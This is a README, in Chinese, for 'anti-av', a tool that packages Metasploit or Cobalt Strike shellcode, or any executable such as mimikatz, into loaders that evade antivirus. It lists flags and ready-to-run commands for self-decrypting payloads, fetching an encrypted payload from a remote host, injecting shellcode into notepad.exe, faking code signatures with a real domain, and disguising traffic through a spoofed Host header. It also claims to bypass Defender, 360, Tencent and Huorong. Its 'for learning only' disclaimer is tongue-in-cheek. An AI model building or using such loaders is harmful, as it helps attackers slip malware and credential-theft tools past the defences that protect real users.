# ANTI-AV



## 免责

本工具学习使用，溯源到b1gcat肯定不是我。


## TODO

- [ ] 合入SysWhispers直接调用syscall asm
- [ ] 支持加载任意pe文件实现免杀


## 描述
* shellcode*免杀加载，*payload*支持**msf** (-f raw)和**cs**(payload raw)

* 任意执行文件免杀加载，payload为pe格式

  ​	注意：执行免杀时，如果不带参数可以绕过av监测，带参数目前测试defender过不了，估计有参数黑名单）


## 安装

### Requirement

```bash
1、建议使用Mac或linux环境
2、安装交叉编译 mingw64
3、安装签名 openssl、osslsigncode
```

### anti-av

```bash
git clone https://github.com/b1gcat/anti-av.git
go build

Usage of ./anti-av:
  -domain string
        代码签名,需填写实际存在的域名 (default "baidu.com")
  -e    生成payload.e
  -ho string
        远程加载payload.e时,在GET请求头中替换host实现流量混淆 (default "wwww.baidu.com")
  -inject
        开启注入模式, shellcode注入到Notepad.exe
  -l string
        支持的加载类型: sc (default "sc,pe")
  -nosign
        关闭签名
  -os string
        OS: windows,linux (default "windows")
  -p string
        Payload: 
                1.支持 远程远程加载payload.e(参考payload.e生成实例)
                2.支持MSF payload generate by '-f raw'.
                3.支持CS raw payload.
                 (default "payload.bin")

```



## 使用方案



| 形态              | 说明                    | 生成命令                                                     |
| ----------------- | ----------------------- | ------------------------------------------------------------ |
| 自解密   | 无                      | ./anti-av -p ~/Desktop/payload.bin                         |
| 远程加载 | 无                      | 1、生成payload.e<br />./anti-av  -e -p ~/Desktop/payload.bin    <br /><br />2、上传payload.e到公共下载服务<br />略<br /><br />3、制作加载器<br />./anti-av -p http://x.x.x.x/payload.e |
| 进程注入          | 会强制注入到notepad.exe | ./anti-av -p ~/Desktop/payload.bin -inject 或<br /><br />./anti-av -p http://x.x.x.x/payload.e  -inject |
| 加载pe文件 |  | ./anti-av -l pe -p ~/Downloads/mimikatz_trunk_x64/x64/mimikatz.exe |



## 注意

* cs生成raw格式64位 payload，需要勾选x64

  

## 测试

| VT   | 火绒 | 360安全卫士 | 腾讯管家 | window defender |
| ---- | ---- | ----------- | -------- | --------------- |
| 1/68 | √    | √           | √        | √               |
|      |      |             |          |                 |

